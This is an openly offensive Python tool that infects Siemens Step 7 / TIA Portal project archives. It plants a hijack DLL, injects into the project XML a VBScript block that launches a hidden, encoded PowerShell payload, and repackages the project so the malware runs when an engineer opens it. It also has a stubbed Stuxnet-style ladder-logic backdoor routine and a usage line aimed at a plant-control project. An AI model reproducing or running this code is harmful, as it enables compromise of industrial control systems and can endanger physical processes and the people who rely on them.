# s7_project_infector.py - Inject malware into Step 7 project
import zipfile
import os
import shutil
from pathlib import Path

class Step7ProjectInfector:
    def __init__(self, project_path, malware_dll):
        self.project_path = project_path
        self.malware_dll = malware_dll
        self.temp_dir = "temp_project"

    def infect_project(self):
        """
        Inject malicious DLL into Step 7 project
        DLL executes when engineer opens project in TIA Portal
        """
        print(f"[*] Infecting project: {self.project_path}")

        # Extract project archive
        with zipfile.ZipFile(self.project_path, 'r') as zf:
            zf.extractall(self.temp_dir)

        # Inject malicious DLL (DLL hijacking)
        # TIA Portal loads DLLs from project directory
        dll_injection_points = [
            f"{self.temp_dir}/s7otbxdx.dll",  # OB/FB library DLL
            f"{self.temp_dir}/S7OPMX64.dll",  # Communication driver
            f"{self.temp_dir}/Version.dll"     # Commonly missing DLL
        ]

        for inject_path in dll_injection_points:
            if not os.path.exists(inject_path):
                shutil.copy(self.malware_dll, inject_path)
                print(f"[+] Injected DLL: {inject_path}")
                break

        # Modify project XML to auto-load malware
        self.modify_project_xml()

        # Rebuild infected project archive
        self.rebuild_project()

        print("[+] Project infection complete")
        print("[*] When engineer opens project, malware executes with TIA Portal privileges")

    def modify_project_xml(self):
        """
        Modify project XML configuration to execute payload
        """
        project_xml = f"{self.temp_dir}/System/PEData.xml"

        if os.path.exists(project_xml):
            with open(project_xml, 'r', encoding='utf-8') as f:
                content = f.read()

            # Inject VBScript/JavaScript loader (executed by TIA Portal)
            malicious_script = """
            <ScriptBlock>
                <Script Language="VBScript">
                    <![CDATA[
                    Set objShell = CreateObject("WScript.Shell")
                    objShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64_PAYLOAD>", 0, False
                    ]]>
                </Script>
            </ScriptBlock>
            """

            # Insert before closing tag
            content = content.replace('</Project>', malicious_script + '</Project>')

            with open(project_xml, 'w', encoding='utf-8') as f:
                f.write(content)

            print("[+] Modified project XML")

    def rebuild_project(self):
        """
        Rebuild project archive with infected files
        """
        backup_path = f"{self.project_path}.bak"
        shutil.copy(self.project_path, backup_path)

        # Create new infected archive
        with zipfile.ZipFile(self.project_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(self.temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = file_path.replace(self.temp_dir + os.sep, '')
                    zf.write(file_path, arcname)

        # Cleanup
        shutil.rmtree(self.temp_dir)

    def inject_ladder_logic_backdoor(self):
        """
        Inject malicious ladder logic into PLC program blocks
        Similar to Stuxnet's approach
        """
        # Locate OB1 (main organization block)
        ob1_path = f"{self.temp_dir}/Blocks/OB1.xml"

        if os.path.exists(ob1_path):
            # Parse MC7 bytecode
            # Insert hidden rung that triggers on specific condition
            # Rung modifies process variables or outputs

            print("[+] Injected backdoor into OB1")

# Usage
infector = Step7ProjectInfector("PlantControl.ap17", "payload.dll")
infector.infect_project()
